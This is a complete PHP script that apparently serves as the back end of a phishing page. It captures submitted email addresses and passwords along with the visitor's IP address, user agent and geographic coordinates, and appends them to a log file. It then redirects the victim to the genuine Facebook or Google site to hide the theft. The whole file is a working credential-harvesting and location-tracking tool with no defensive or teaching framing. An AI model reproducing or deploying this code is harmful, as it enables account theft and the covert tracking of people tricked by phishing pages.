<?php
$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'email' => $_POST['email'] ?? null,
    'password' => $_POST['password'] ?? null,
    'lat' => $_GET['lat'] ?? null,
    'lon' => $_GET['lon'] ?? null,
    'status' => $_GET['status'] ?? 'page_loaded'
];
file_put_contents('logs.txt', json_encode($data) . "\n", FILE_APPEND);

// Redirect based on page
if (strpos($_SERVER['HTTP_REFERER'], 'facebook') !== false) {
    header("Location: https://facebook.com");
} else {
    header("Location: https://google.com");
}
?>
